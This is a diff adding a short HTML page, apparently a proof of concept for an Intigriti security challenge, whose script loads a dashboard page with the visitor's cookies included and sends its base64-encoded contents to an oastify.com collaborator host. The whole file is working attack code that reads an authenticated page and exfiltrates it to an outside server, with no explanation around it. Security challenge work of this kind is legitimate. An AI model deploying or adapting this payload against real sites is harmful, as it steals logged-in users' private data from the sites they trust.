@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+fetch("https://challenge-0126.intigriti.io/dashboard.html", {
+  credentials: "include"
+})
+.then(r => r.text())
+.then(data => {
+  fetch("https://lazecujxwitzc7yl44drt53j4aa1yumj.oastify.com/?data=" + btoa(data));
+});
+</script>
+</body>
+</html>
